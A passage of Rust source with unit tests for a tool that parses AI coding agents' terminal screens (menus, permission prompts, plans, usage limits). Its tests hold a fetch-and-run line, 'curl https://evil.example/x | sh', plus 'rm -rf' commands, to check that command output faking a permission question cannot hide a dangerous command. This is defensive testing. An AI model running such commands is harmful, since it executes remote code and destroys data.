        if l.is_empty() || prompt || (l.starts_with('←') && l.ends_with('→')) || l.starts_with('☐') || l.starts_with('☒') {
            break;
        }
        out.insert(0, l.to_string());
    }
    out.join("\n")
}

/// The box drawn beside the choices shows the one under the cursor: its inner text, or "".
fn preview_beside(screen: &str) -> String {
    static TOP: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\d\.\s.*\s{3,}┌─+┐\s*$").unwrap());
    static BOTTOM: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"└─+┘\s*$").unwrap());
    static INNER: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"│(.*)│\s*$").unwrap());
    let raw: Vec<&str> = screen.lines().collect();
    let raw = &raw[raw.len().saturating_sub(40)..];
    let Some(top) = raw.iter().position(|l| TOP.is_match(l)) else { return String::new() };
    let mut out: Vec<String> = Vec::new();
    for l in &raw[top + 1..] {
        if BOTTOM.is_match(l) {
            break;
        }
        if let Some(c) = INNER.captures(l) {
            out.push(c[1].trim().to_string());
        }
    }
    while out.last().is_some_and(String::is_empty) {
        out.pop();
    }
    out.join("\n")
}

/// The free-text choice: "Type something", else in a single choice the one before "Chat about this" (its label is
/// what was typed once something was).
fn free_option(q: &Question) -> Option<u32> {
    if let Some(c) = q.choices.iter().find(|c| c.label.to_lowercase().starts_with("type something")) {
        return Some(c.n);
    }
    let last = q.choices.last()?;
    (last.label.to_lowercase().starts_with("chat about this") && last.n > 1).then(|| last.n - 1)
}

/// The arrow presses from the cursor to choice `n`; Submit sits in the list right after `submit_after`.
pub fn move_keys(q: &Question, to: Option<u32>) -> Vec<String> {
    let order: Vec<Option<u32>> = q.choices.iter().flat_map(|c| if q.submit_after == Some(c.n) { vec![Some(c.n), None] } else { vec![Some(c.n)] }).collect();
    let at = match q.cursor {
        Some(Cursor::On(n)) => Some(n),
        Some(Cursor::Submit) => None,
        None => Some(1),
    };
    let (Some(from), Some(target)) = (order.iter().position(|o| *o == at), order.iter().position(|o| *o == to)) else { return Vec::new() };
    let key = if target > from { "down" } else { "up" };
    vec![key.to_string(); from.abs_diff(target)]
}

/// A line an agent says something on: Claude Code's "⏺", Codex's "•".
static SAID: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\s*[⏺•]\s+(.+?)\s*$").unwrap());
/// What such a line holds when it is a tool call or a hook's note, not words.
static TOOL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[A-Z][A-Za-z]*\(|hook was skipped|^User (answered|declined)").unwrap());

/// Whether a line is a tool call the agent made ("⏺ Bash(mix test)").
fn tool_call(line: &str) -> bool {
    SAID.captures(line).is_some_and(|c| TOOL.is_match(&c[1]))
}

/// The agent's last words on screen: its last "⏺"/"•" line that is not a tool call or hook noise.
pub fn last_message(screen: &str) -> String {
    screen.lines().rev().filter_map(|l| SAID.captures(l)).map(|c| c[1].to_string()).find(|t| !TOOL.is_match(t)).unwrap_or_default()
}

/// What an agent's screen says it is doing: the step it is on while it works, and the permission mode its footer shows.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Activity {
    /// The step above its spinner, as the agent words it: "Reading sandbox script usage".
    pub task: Option<String>,
    /// The line under that step, when it has one: "$ sed -n 1,60p scripts/sandbox.sh".
    pub detail: Option<String>,
    /// The mode its footer shows, in Claude Code's words; `default` when the footer shows none.
    pub mode: Option<String>,
}

/// The step an agent is on and the mode it is in, read off the bottom of its screen under its own shapes.
pub fn activity(screen: &str, shapes: &Shapes) -> Activity {
    let lines: Vec<&str> = screen.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
    let from = lines.len().saturating_sub(BOTTOM_LINES);
    // A spinner still turning says "…" or "esc to interrupt"; "Worked for 2m" is a turn that ended.
    let spinner = (from..lines.len())
        .rev()
        .find(|&i| Shapes::any(&shapes.busy, lines[i]) && (lines[i].contains('…') || lines[i].contains("...") || lines[i].contains("esc to interrupt")));
    // The step is the nearest line above it that the agent marks as its own ("⏺", "●"), or that a "⎿" line hangs under:
    // Claude Code blinks the mark of a call still running, so half the time the line has none.
    let marked = |i: usize| lines[i].starts_with(['⏺', '●']) || (!lines[i].starts_with('⎿') && lines.get(i + 1).is_some_and(|l| l.starts_with('⎿')));
    let step = spinner.and_then(|at| (at.saturating_sub(STEP_LINES)..at).rev().find(|&i| marked(i)));
    let task = step.map(|i| lines[i].trim_start_matches(['⏺', '●']).trim().to_string()).filter(|t| !t.is_empty());
    let detail =
        step.and_then(|i| lines.get(i + 1)).filter(|l| l.starts_with('⎿')).map(|l| l.trim_start_matches('⎿').trim().to_string()).filter(|d| !d.is_empty());
    let mode = lines[from..].iter().rev().find_map(|l| {
        let l = l.to_lowercase();
        let shown = [
            ("auto mode on", "auto"),
            ("manual mode on", "default"),
            ("accept edits on", "acceptEdits"),
            ("plan mode on", "plan"),
            ("bypass permissions on", "bypassPermissions"),
        ];
        shown
            .iter()
            .find(|(words, _)| l.contains(words))
            .map(|(_, mode)| (*mode).to_string())
            .or_else(|| l.starts_with("? for shortcuts").then(|| "default".to_string()))
    });
    Activity { task, detail, mode }
}

/// How far up from the bottom of a screen its spinner and footer are looked for.
const BOTTOM_LINES: usize = 14;
/// How far above the spinner the step it is on is looked for, past the output a call printed.
const STEP_LINES: usize = 40;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_working_screen_says_what_it_does_and_in_which_mode() {
        let shapes = Shapes::of("claude");
        let screen = "⏺ Done.\n\n● Reading sandbox script usage\n  ⎿  $ sed -n 1,60p scripts/sandbox.sh\n\n✻ Grooving… (34m 5s · ↓ 11.1k tokens · thought for 8s)\n  ⎿  Tip: Use /clear to start fresh\n\n────\n❯ \n────\n  7d 52%\n  ⏵⏵ auto mode on (shift+tab to cycle)\n";
        let a = activity(screen, &shapes);
        assert_eq!(a.task.as_deref(), Some("Reading sandbox script usage"));
        assert_eq!(a.detail.as_deref(), Some("$ sed -n 1,60p scripts/sandbox.sh"));
        assert_eq!(a.mode.as_deref(), Some("auto"));
        let blinked = activity(&screen.replace("● Reading", "  Reading"), &shapes);
        assert_eq!(blinked.task.as_deref(), Some("Reading sandbox script usage"), "a running call's mark blinks");
        let done = activity("● Reading it\n✻ Cooked for 3m 9s\n────\n❯ \n────\n  ? for shortcuts\n", &shapes);
        assert_eq!(done, Activity { mode: Some("default".into()), ..Activity::default() }, "a turn that ended is on no step");
        assert_eq!(activity("⏸ plan mode on (shift+tab to cycle)", &shapes).mode.as_deref(), Some("plan"));
        assert_eq!(activity("⏸ manual mode on", &shapes).mode.as_deref(), Some("default"), "Claude Code 2.1.311's default");
    }

    #[test]
    fn a_draft_is_what_is_typed_in_the_box() {
        let boxed = |typed: &str, under: usize| {
            format!("⏺ Done.\n\n╭────────────────────────╮\n│ > {typed} │\n╰────────────────────────╯\n{}", "  ? for shortcuts\n".repeat(under))
        };
        assert_eq!(draft(&boxed("fix the build", 1)).as_deref(), Some("fix the build"));
        assert_eq!(draft(&boxed("", 1)).as_deref(), Some(""));
        assert_eq!(draft(&boxed("Try \"fix lint errors\"", 1)).as_deref(), Some(""), "Claude Code's suggestion in an empty box");
        assert_eq!(draft(&boxed("Try \"fix lint\" then push", 1)).as_deref(), Some("Try \"fix lint\" then push"), "words around it are typed");
        assert_eq!(draft(&boxed("fix the build", 12)).as_deref(), Some("fix the build"), "found under many status lines");
        assert_eq!(draft("$ ls\nfoo bar\n"), None, "no box: nothing to tell");
    }

    const SINGLE: &str = "⏺ Old invoices store two dates. Before I migrate 48,210 rows I need one decision.

 ☐ Invoice date

Which date should old invoices keep?

❯ 1. Issue date
     Matches the PDFs
  2. Payment date
     What reports use
  3. Type something.
  4. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel";

    const MULTI: &str = "Which platforms should sync offline drafts?

  1. [✔] iOS
❯ 2. [✔] macOS
  3. [ ] Web
     needs IndexedDB
  4. [ ] Type something
     Submit
";

    #[test]
    fn a_single_choice_reads_with_its_cursor_details_and_free_field() {
        let q = read(SINGLE);
        assert_eq!(q.text, "Which date should old invoices keep?");
        assert_eq!(q.kind(), "single");
        assert_eq!(q.choices.len(), 4);
        assert_eq!((q.choices[0].label.as_str(), q.choices[0].detail.as_str()), ("Issue date", "Matches the PDFs"));
        assert_eq!(q.cursor, Some(Cursor::On(1)));
        assert_eq!(q.free, Some(3));
        assert_eq!(move_keys(&q, Some(2)), ["down"]);
        assert_eq!(last_message(SINGLE), "Old invoices store two dates. Before I migrate 48,210 rows I need one decision.");
    }

    #[test]
    fn a_multiple_choice_reads_its_boxes_and_where_submit_is() {
        let q = read(MULTI);
        assert_eq!(q.kind(), "multi");
        assert_eq!(q.choices.iter().map(|c| c.checked).collect::<Vec<_>>(), [Some(true), Some(true), Some(false), Some(false)]);
        assert_eq!(q.choices[2].detail, "needs IndexedDB");
        assert_eq!(q.submit_after, Some(4));
        assert_eq!(q.cursor, Some(Cursor::On(2)));
        assert_eq!(q.free, Some(4));
        assert_eq!(move_keys(&q, None), ["down", "down", "down"]);
        assert_eq!(move_keys(&q, Some(1)), ["up"]);
    }

    #[test]
    fn a_screen_without_a_menu_is_a_free_text_question() {
        let q = read("⏺ Done with the migration.\n\nShall I open the PR now, or wait for the backfill?\n");
        assert_eq!((q.kind(), q.choices.len()), ("text", 0));
        assert!(q.text.ends_with("or wait for the backfill?"));
    }

    fn shapes(id: &str) -> Vec<String> {
        cockpit_core::agent::builtin().into_iter().find(|a| a.id == id).map(|a| a.permission).unwrap_or_default()
    }

    const BASH: &str = include_str!("../tests/fixtures/screens/claude-bash.txt");
    const EDIT: &str = include_str!("../tests/fixtures/screens/claude-edit.txt");
    const PLAN: &str = include_str!("../tests/fixtures/screens/claude-plan.txt");
    const PLAN_SCROLL: &str = include_str!("../tests/fixtures/screens/claude-plan-scroll.txt");
    const TRUST: &str = include_str!("../tests/fixtures/screens/claude-trust.txt");

    #[test]
    fn a_plan_approval_shows_the_whole_plan_from_the_transcript_as_markdown() {
        let claude = shapes("claude");
        let plan = "# Daily quota\n\n1. Add a daily_limit column to plans\n2. Read it in `Api.Quota.limit/2`";
        let mut scroll = read_as(PLAN_SCROLL, &claude);
        let asked = scroll.identity();
        scroll.with_plan(plan);
        assert!((scroll.preview.as_str(), scroll.cut, scroll.markdown) == (plan, false, true), "{scroll:?}");
        assert_eq!(scroll.identity(), asked, "the prompt is still the one on the screen");
        assert_eq!(scroll.json()["markdown"], true);
        assert_eq!(scroll.json()["terminal_only"], Value::Null);
        // The older box, cut by its screen: the plan still fills it in.
        let mut boxed = read_as(PLAN, &claude);
        boxed.with_plan(plan);
        assert!(boxed.markdown && boxed.preview == plan, "{boxed:?}");
        // A tool's permission, a question of the agent's own, and an empty plan change nothing.
        let mut bash = read_as(BASH, &claude);
        bash.with_plan(plan);
        assert!(!bash.markdown && bash.preview.starts_with("Bash command"), "{bash:?}");
        let mut ask = read_as(ASK, &claude);
        ask.with_plan(plan);
        assert!(!ask.markdown && !ask.permission, "{ask:?}");
        let mut none = read_as(PLAN_SCROLL, &claude);
        none.with_plan("  ");
        assert!(!none.markdown && !none.cut, "{none:?}");
        assert_eq!(read(BASH).json()["markdown"], false);
        // Said without a menu: words answer it, and no plan goes with them.
        let mut words = read("⏺ Here is the plan: add the column.\n\n╭──────────╮\n│ >        │\n╰──────────╯\n");
        words.with_plan(plan);
        assert!(!words.markdown && !words.permission, "{words:?}");
    }

    #[test]
    fn other_agents_plan_approvals_are_told_by_their_documented_choices() {
        let plan = "## Steps\n\n1. Add the column";
        // Codex (/plan): the choices name the plan; its command approval does not.
        let mut codex = read("  Ready to implement?\n\n› 1. Yes, implement this plan\n  2. Yes, clear context and implement\n  3. No, stay in Plan mode\n");
        codex.with_plan(plan);
        assert!((codex.permission, codex.markdown, codex.preview.as_str()) == (true, true, plan), "{codex:?}");
        let mut command = read_as(CODEX, &shapes("codex"));
        command.with_plan(plan);
        assert!(!command.markdown && command.preview.contains("mix test"), "{command:?}");
        // Qwen Code (exit_plan_mode): its documented labels, with no plan named anywhere on the screen.
        let mut qwen =
            read("  Approve to continue?\n\n❯ 1. Restore Previous\n  2. Proceed Once\n  3. Proceed Always\n  4. Cancel\n\nEnter to select · Esc to cancel");
        qwen.with_plan(plan);
        assert!((qwen.permission, qwen.markdown, qwen.cut) == (true, true, false), "{qwen:?}");
        // Gemini CLI (exit_plan_mode): yes/yes choices alone say nothing; its question names the plan.
        let mut gemini = read("  Apply this plan?\n\n❯ 1. Yes, automatically accept edits\n  2. Yes, manually accept edits\n\nEnter to select");
        gemini.with_plan(plan);
        assert!(gemini.markdown && gemini.permission, "{gemini:?}");
        let mut edits = read("  Apply this change?\n\n❯ 1. Yes, allow once\n  2. Yes, allow always\n  3. No\n");
        edits.with_plan(plan);
        assert!(!edits.markdown && edits.preview == "Apply this change?", "a tool's own approval, read as its agent's shapes say: {edits:?}");
    }
    const ASK: &str = include_str!("../tests/fixtures/screens/claude-ask.txt");
    const CODEX: &str = include_str!("../tests/fixtures/screens/codex-command.txt");

    #[test]
    fn permission_prompts_are_told_by_their_shape_and_show_what_they_allow() {
        let (claude, codex) = (shapes("claude"), shapes("codex"));
        let bash = read_as(BASH, &claude);
        assert!(bash.permission && bash.numbered);
        assert_eq!(bash.block.first().map(String::as_str), Some("Bash command"), "the block starts under the rule");
        assert_eq!(bash.preview, "Bash command\nmix test test/api/quota_test.exs\nRun the quota tests");
        assert_eq!(bash.cursor, Some(Cursor::On(1)), "the screen's cursor is kept for the keys");
        assert_eq!(bash.json()["cursor"], Value::Null, "but no choice is drawn as picked");
        assert_eq!(bash.json()["choices"][2]["label"], "No, and tell Claude what to do differently (esc)");

        let edit = read_as(EDIT, &claude);
        assert!(edit.permission);
        assert!(edit.preview.contains("12 +  @limit Application.get_env(:api, :daily_limit, 100)"), "{}", edit.preview);

        let plan = read_as(PLAN, &claude);
        assert!(plan.permission);
        assert_eq!(
            plan.choices.iter().map(|c| c.label.as_str()).collect::<Vec<_>>(),
            ["Yes, and auto-accept edits", "Yes, and manually approve edits", "No, keep planning"]
        );
        assert!(plan.preview.contains("Ready to code?") && plan.preview.contains("1. Add a daily_limit column to plans"), "{}", plan.preview);

        // A plan in a scrolling box under a rule of eighth blocks: the prompt starts at the rule, so nothing is cut.
        let scroll = read_as(PLAN_SCROLL, &claude);
        assert!(scroll.permission && !scroll.cut, "{scroll:?}");
        assert_eq!(
            scroll.choices.iter().map(|c| c.label.as_str()).collect::<Vec<_>>(),
            ["Yes, and use auto mode", "Yes, manually approve edits", "Tell Claude what to change"]
        );
        assert!(scroll.preview.starts_with("- Read it in Api.Quota.limit/2") && !scroll.preview.contains("· summary"), "{}", scroll.preview);
        assert_eq!(scroll.text, "Claude has written up a plan and is ready to execute. Would you like to proceed?");

        let trust = read_as(TRUST, &claude);
        assert!(trust.permission && !trust.numbered, "the folder trust menu has no numbers");
        assert_eq!(trust.choices.iter().map(|c| c.label.as_str()).collect::<Vec<_>>(), ["No, exit", "Yes, I trust this folder"]);
        assert_eq!(move_keys(&trust, Some(2)), ["down"], "answered with arrows");
        assert!(trust.preview.contains("/Users/me/code/api"));

        let run = read_as(CODEX, &codex);
        assert!(run.permission);
        assert!(run.block.iter().any(|l| l == "Would you like to run the following command?"), "{:?}", run.block);
        assert!(run.preview.contains("$ mix test test/api/quota_test.exs"));
        assert_eq!(run.choices[0].label, "Yes, proceed (y)");

        let ask = read_as(ASK, &claude);
        assert!(!ask.permission, "a question the agent asks the person, though it opens with “Do you want to proceed”");
        // Without the agent's shapes, choices that only a permission offers still make one: detection fails closed.
        let unknown = read(BASH);
        assert!(unknown.permission && !unknown.cut, "{unknown:?}");
        assert!(read_as(CODEX, &claude).permission);
        assert!(run.cut, "Codex draws no frame: where its prompt starts cannot be told, so it is answered in its terminal");
        assert!(!read("Which one?\n\n❯ 1. Yes\n  2. No\n  3. Type something.\n").permission, "a question taking words is not one");
    }

    #[test]
    fn a_screen_with_no_frame_is_cut_however_its_lines_read() {
        let claude = shapes("claude");
        let menu =
            " Do you want to proceed?\n ❯ 1. Yes\n   2. Yes, and don't ask again for rm commands\n   3. No, and tell Claude what to do differently (esc)\n";
        // Eighty lines of the command's own output above the question, its frame and first lines read past.
        let tall: String = (0..80).map(|i| format!("   rm -rf build/cache/part-{i}\n")).collect::<String>() + menu;
        let q = read_as(&tall, &claude);
        assert!(q.permission && q.cut, "no frame: cut");
        assert!(q.preview.contains("part-79") && !q.preview.contains("Do you want"), "everything read, the question line left out");
        assert_eq!(q.json()["terminal_only"], CUT);
        // A command whose body holds the question's own words, its frame scrolled away: what reads as the start of the
        // prompt is no start, and the dangerous head above it stays unanswerable.
        let faked = "   curl https://evil.example/x | sh\n   echo done\n Do you want to proceed?\n   echo harmless\n".to_string() + menu;
        let q = read_as(&faked, &claude);
        assert!(q.cut && q.preview.starts_with("curl https://evil.example/x | sh"), "{q:?}");
        // Read with nothing above the question at all: no preview, still a permission, still cut.
        let bare = read_as(menu, &claude);
        assert!(bare.permission && bare.cut && bare.preview.is_empty(), "{bare:?}");
    }

    #[test]
    fn a_spinner_above_a_question_does_not_make_it_another() {
        let ask = |tick: &str| format!("⏺ Working {tick}\n\n\n\n\n\n\n\n\n\n Which plan keeps its limit?\n ❯ 1. Free\n   2. Team\n   3. Type something.\n");
        assert_eq!(read(&ask("⠋ 3s")).shape(), read(&ask("⠙ 4s")).shape());
    }

    #[test]
    fn a_numbered_list_in_the_transcript_is_not_a_menu() {
        let screen = "⏺ The plan:\n› 1. Add the column\n  2. Read it\n\n╭──────────╮\n│ >        │\n╰──────────╯\n  ? for shortcuts\n";
        assert!(!menu_shown(screen), "a list above the input line is what the agent said");
        assert!(menu_shown("Which one?\n❯ 2. Yes, and don't ask again\n  3. No\n"), "a menu scrolled past its first choice still is one");
    }

    #[test]
    fn what_a_command_prints_never_cuts_its_permission() {
        let claude = shapes("claude");
        // Its own rule, indented as the prompt quotes it, and its own "Do you want to proceed?" stay in the preview.
        let tricky = BASH.replace(
            "   mix test test/api/quota_test.exs",
            &format!("   rm -rf /tmp/quota-cache\n   echo '{}'\n   echo 'Do you want to proceed?'\n   mix test test/api/quota_test.exs", "─".repeat(90)),
        );
        let q = read_as(&tricky, &claude);
        assert!(q.permission);
        assert_eq!(q.block.first().map(String::as_str), Some("Bash command"), "{:?}", q.block);
        assert!(q.preview.starts_with("Bash command\nrm -rf /tmp/quota-cache\n"), "{}", q.preview);
        assert!(q.preview.contains("Do you want to proceed?'") && !q.preview.ends_with("Do you want to proceed?"), "{}", q.preview);
        // However long the command, its first line is there.
        let long: String = (0..60).map(|i| format!("   echo step {i}\n")).collect();
        let q = read_as(&BASH.replace("   mix test test/api/quota_test.exs\n", &long), &claude);
        assert!(q.preview.contains("echo step 0\n") && q.preview.contains("echo step 59"), "{}", q.preview);
        // Past the top of the screen, with no frame and no question line, it says it is cut.
        let q = read("   echo step 59\n\n ❯ 1. Yes\n   2. No, and tell the agent what to do differently\n");
        assert!(q.permission && q.cut, "{q:?}");
        assert_eq!(q.json()["cut"], true);
    }

    const LIMIT: &str = include_str!("../tests/fixtures/screens/claude-limit.txt");
    const LIMIT_NO_BOX: &str = include_str!("../tests/fixtures/screens/claude-limit-no-box.txt");
    const REPLIED: &str = include_str!("../tests/fixtures/screens/claude-replied.txt");
    const RESTED: &str = include_str!("../tests/fixtures/screens/claude-rested.txt");

    /// A Claude Code screen: what it said, its input box under a rule with the session's name, a status line, a mode line.
    fn footed(said: &str, status: &str, mode: &str, boxed: bool) -> String {
        let rule = "─".repeat(96);
        let input = if boxed { format!("{} daily-quotas ─\n❯\u{a0}\n{rule}\n", "─".repeat(80)) } else { String::new() };
        format!("{said}\n\n✻ Worked for 2m 14s\n\n{input}  {status}\n  {mode}\n")
    }

    const MODES: [&str; 6] = [
        "⏵⏵ auto mode on (shift+tab to cycle)",
        "⏵⏵ accept edits on (shift+tab to cycle)",
        "⏸ plan mode on (shift+tab to cycle)",
        "⏵⏵ bypass permissions on (shift+tab to cycle)",
        "plan mode on",
        "? for shortcuts",
    ];

    #[test]
    fn a_status_line_and_a_mode_line_are_never_the_question() {
        let claude = Shapes::of("claude");
        // Stopped at its limit, its status line and mode line at the bottom: nothing asked, and neither line is a question.
        for screen in [LIMIT, LIMIT_NO_BOX] {
            let q = read_for(screen, &claude);
            assert!(!q.asks() && q.choices.is_empty(), "{q:?}");
            assert_eq!(q.limit, Some(Limit { reset: Some("08:00".into()), zone: None }), "its last output says so, and when it ends");
            assert!(!q.block.iter().any(|l| l.contains("7d 100%") || l.contains("auto mode") || l.contains("daily-quotas")), "{:?}", q.block);
        }
        // Each mode line, under each status line, with the box and without it, for its own agent and for one cockpit
        // does not know: what it said reads without its furniture, a question always, a statement where its empty box
        // waits for words.
        for shapes in [Shapes::of("claude"), Shapes::of("some-other-agent"), std::sync::Arc::new(Shapes::asking(&[]))] {
            for mode in MODES {
                for status in ["7d 100%", "C 64%·5h", "5h 64% · 7d 38%", "41% context left"] {
                    for boxed in [true, false] {
                        let said = "⏺ Opened api#2198 with the quota middleware.";
                        let rested = read_for(&footed(said, status, mode, boxed), &shapes);
                        assert!(rested.limit.is_none() && !rested.replied, "{mode} / {status} / {boxed}: {rested:?}");
                        assert_eq!(rested.text, if boxed { said } else { "" }, "{mode} / {status} / {boxed}");
                        let asked = read_for(&footed("⏺ The banner is in. Which platforms should show it first?", status, mode, boxed), &shapes);
                        assert_eq!(asked.text, "⏺ The banner is in. Which platforms should show it first?", "{mode} / {status} / {boxed}");
                        assert_eq!(asked.block, ["⏺ The banner is in. Which platforms should show it first?"], "{mode} / {status} / {boxed}");
                    }
                }
            }
        }
        // A box far from the bottom of a tall pane still takes words; a draft in it, or a spinner still turning, asks
        // nothing.
        let tall = footed("⏺ Opened api#2198.", "7d 100%", MODES[0], true) + &"\n".repeat(20);
        assert_eq!(read_for(&tall, &claude).text, "⏺ Opened api#2198.");
        let typing = footed("⏺ Opened api#2198.", "7d 100%", MODES[0], true).replace("❯\u{a0}\n", "❯\u{a0}what about the web banner?\n");
        assert!(!read_for(&typing, &claude).asks(), "what is typed in the box is not asked by the agent");
        let spinning =
            "⏺ Reading lib/api/quota.ex\n\n✻ Thinking… (12s · ↓ 1.2k tokens · esc to interrupt)\n\n  7d 100%\n  ⏵⏵ auto mode on (shift+tab to cycle)\n";
        assert!(!read_for(spinning, &claude).asks());
        assert_eq!(read_for(RESTED, &claude).text, "⏺ Opened api#2198 with the quota middleware and its tests.", "its empty box takes a reply");
    }

    #[test]
    fn the_agents_last_message_is_read_whole_and_its_own_words_are_never_furniture() {
        let claude = Shapes::of("claude");
        let read_boxed = |said: &str, boxed: bool| read_for(&footed(said, "7d 100%", MODES[0], boxed), &claude).text;
        // A question followed by more words is still asked, and so is a request with an empty box under it.
        let either = "⏺ Should I backfill now or wait?\n\nEither way the tests pass.";
        assert_eq!(read_boxed(either, false), "⏺ Should I backfill now or wait?\nEither way the tests pass.");
        assert_eq!(read_boxed("⏺ Tell me which option you prefer.", true), "⏺ Tell me which option you prefer.");
        assert_eq!(read_boxed("⏺ Tell me which option you prefer.", false), "", "no box: nothing tells it waits for words");
        // From its last line of words: an earlier message and a tool's output are not part of it.
        let earlier = "⏺ Which one first?\n\n⏺ Bash(mix test)\n  ⎿  42 tests, 0 failures\n\n⏺ All green: shall I push?";
        assert_eq!(read_boxed(earlier, false), "⏺ All green: shall I push?");
        // A question mark in a link asks nothing.
        assert_eq!(read_boxed("⏺ Opened https://acme.example/api/pull/2198?tab=files", false), "");
        // What the agent says that looks like its furniture stays what it says.
        assert_eq!(read_boxed("⏺ Plan mode on staging?", false), "⏺ Plan mode on staging?");
        assert_eq!(read_boxed("⏺ Ship it today?\n  * Wait for 2 days?", false), "⏺ Ship it today?\n* Wait for 2 days?");
        assert_eq!(
            read_boxed("⏺ Shall I add a flag?\n  (enter to skip) the flag defaults to off", false),
            "⏺ Shall I add a flag?\n(enter to skip) the flag defaults to off"
        );
    }

    #[test]
    fn shapes_are_compiled_once_per_agent_and_found_by_an_alias() {
        assert!(std::sync::Arc::ptr_eq(&Shapes::of("claude"), &Shapes::of("claude")), "compiled once while the config stays");
        // Herdr's name for Claude Code takes Claude's permission shapes, not every agent's.
        assert_eq!(Shapes::of("claude-code").permission.len(), Shapes::of("claude").permission.len());
        assert!(read_for(BASH, &Shapes::of("claude-code")).permission);
    }

    const LOOKALIKES: &str = include_str!("../tests/fixtures/screens/claude-limit-lookalikes.txt");

    #[test]
    fn a_question_or_a_tools_output_about_a_limit_is_no_limit_reached() {
        for shapes in [Shapes::of("claude"), Shapes::of("gemini")] {
            for said in LOOKALIKES.split("\n----\n") {
                let q = read_for(&footed(said.trim_end(), "7d 100%", MODES[0], true), &shapes);
                assert_eq!(q.limit, None, "{said}");
                assert!(q.asks(), "{said}: {q:?}");
            }
        }
        // An agent with no limit shapes of its own reads any agent's words for one, in what it says itself.
        let gemini = Shapes::of("gemini");
        assert!(read_for("✦ Quota limit exceeded for this project.\n", &gemini).limit.is_some());
        assert!(read_for("✦ Quota limit exceeded for this project.\n", &Shapes::of("claude")).limit.is_none(), "Claude says it its own way");
    }

    #[test]
    fn a_list_above_the_input_box_is_not_a_choice() {
        let claude = Shapes::of("claude");
        let listed = footed("⏺ The plan:\n  1. Add the column\n  2. Read it in the middleware", "7d 100%", MODES[0], true);
        let q = read_for(&listed, &claude);
        assert!(q.choices.is_empty() && q.text.starts_with("⏺ The plan:"), "what it said, its box waiting for words: {q:?}");
        // A menu keeps its choices with the cursor on its last line, which reads like an input line.
        let trust = TRUST.replace(" ❯ No, exit\n   Yes, I trust this folder", "   No, exit\n ❯ Yes, I trust this folder");
        assert_eq!(read_for(&trust, &claude).choices.len(), 2);
        assert_eq!(read_for(BASH, &claude).choices.len(), 3);
    }

    #[test]
    fn a_limit_reads_from_the_last_output_until_it_is_over() {
        let claude = Shapes::of("claude");
        let at = |said: &str| read_for(&footed(said, "7d 100%", MODES[0], true), &claude).limit;
        let limit = |reset: Option<&str>, zone: Option<&str>| Some(Limit { reset: reset.map(str::to_string), zone: zone.map(str::to_string) });
        assert_eq!(at("⏺ Usage limit reached · continuing automatically at 8am · esc to cancel"), limit(Some("08:00"), None));
        assert_eq!(at("  ⎿  You've hit your limit · resets 3:30pm (America/New_York)"), limit(Some("15:30"), Some("America/New_York")));
        assert_eq!(at("  ⎿  Weekly limit reached ∙ resets Oct 12 at 8am"), limit(Some("12 Oct 08:00"), None));
        assert_eq!(at("  ⎿  API Error: 429 rate_limit_error"), limit(None, None), "no reset on the screen: none is made up");
        // What the person typed since does not end it; the agent saying something else, or that it is over, does.
        let replied = "⏺ Usage limit reached · continuing automatically at 8am · esc to cancel\n\n❯ go on with the edge-case tests";
        assert_eq!(at(replied), limit(Some("08:00"), None));
        assert_eq!(at("⏺ Usage limit reached · continuing automatically at 8am · esc to cancel\n\n⏺ Usage limit has reset · Press enter to continue"), None);
        assert_eq!(at("  ⎿  You've hit your limit · resets 8am\n\n⏺ Back at it: the edge-case tests pass."), None);
        assert_eq!(at("⏺ The rate limit middleware rejects the 101st request."), None, "words about a limit are not one reached");
        // Another agent's own words: a wait is not a time of day.
        let codex = |said: &str| read_for(&format!("{said}\n\n› Ask Codex to do anything\n\n  ? for shortcuts    41% context left\n"), &Shapes::of("codex"));
        let q = codex("■ You've hit your usage limit. Upgrade to Pro or try again at 3:14 PM.");
        assert_eq!(q.limit, limit(Some("15:14"), None));
        assert!(!q.asks() && !q.replied, "Codex's box has no frame: its hint is not what the person sent");
        assert_eq!(codex("■ You've hit your usage limit. Try again in 2 hours 13 minutes.").limit, limit(None, None));
        assert_eq!(read("Quota limit exceeded for this project.\n").limit, limit(None, None));
    }

    #[test]
    fn the_persons_own_words_above_the_box_say_it_was_answered() {
        let claude = Shapes::of("claude");
        let q = read_for(REPLIED, &claude);
        assert!(q.replied && !q.asks(), "{q:?}");
        assert!(!read_for(&REPLIED.replace("❯ Web and iOS first, Android after the 4.12 release.\n\n", ""), &claude).replied, "still asked");
        assert!(read_for(&REPLIED.replace("❯ Web and iOS first, Android after the 4.12 release.\n\n", ""), &claude).asks());
        assert!(!read_for(LIMIT, &claude).replied);
    }

    #[test]
    fn a_question_keeps_its_fingerprint_while_it_is_answered() {
        let q = read(MULTI);
        let count = 3;
        assert_eq!(q.block, ["Which platforms should sync offline drafts?"]);
        // The person ticks iOS off, moves the cursor and types in the free field: still the same question.
        let moved = read(&MULTI.replace("1. [✔] iOS", "1. [ ] iOS").replace("❯ 2.", "  2.").replace("  4. [ ] Type something", "❯ 4. [ ] Linux too"));
        assert_eq!((moved.cursor.clone(), moved.choices[0].checked), (Some(Cursor::On(4)), Some(false)));
        assert_eq!(moved.fingerprint(count), q.fingerprint(count));
        // A different question, other choices, or the next prompt seen are not.
        assert_ne!(read(&MULTI.replace("offline drafts", "settings")).fingerprint(count), q.fingerprint(count));
        assert_ne!(read(&MULTI.replace("3. [ ] Web", "3. [ ] Watch")).fingerprint(count), q.fingerprint(count));
        assert_ne!(q.fingerprint(count + 1), q.fingerprint(count));
        assert_eq!(q.fingerprint(count).len(), 16);
        let single = read(SINGLE);
        assert_eq!(single.block.len(), 3, "the lines above choice 1, blanks left out: {:?}", single.block);
        assert_ne!(single.fingerprint(count), q.fingerprint(count));
        // The whole command counts, however long the block above it.
        let longer = BASH.replace(
            "   Run the quota tests",
            "   Run the quota tests\n   then the billing ones\n   and the export ones\n   and the search ones\n   and the admin ones\n   and the rest",
        );
        let claude = shapes("claude");
        assert_ne!(read_as(&longer, &claude).fingerprint(count), read_as(&longer.replace("the rest", "nothing else"), &claude).fingerprint(count));
        // A text question tells itself apart by its last lines, never by what is typed in its box or its status line.
